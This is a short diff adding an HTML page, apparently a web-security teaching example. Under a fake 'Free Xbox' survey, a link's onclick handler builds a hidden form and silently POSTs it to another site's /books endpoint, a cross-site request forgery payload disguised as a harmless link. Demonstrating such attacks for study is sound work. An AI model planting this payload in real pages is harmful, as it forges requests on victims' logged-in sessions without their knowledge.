@@ -1,0 +1,11 @@
+<h1>Survey to win a Free Xbox</h1>
+<p>Complete this survey and win!</p>
+
+<a href="http://host2.com:3001/survey" onclick="
+  var f = document.createElement('form');
+  f.style.display = 'none';
+  this.parentNode.appendChild(f);
+  f.method = 'POST';
+  f.action = 'http://host1.com:3000/books';
+  f.submit();
+  return false;">To the harmless survey</a>
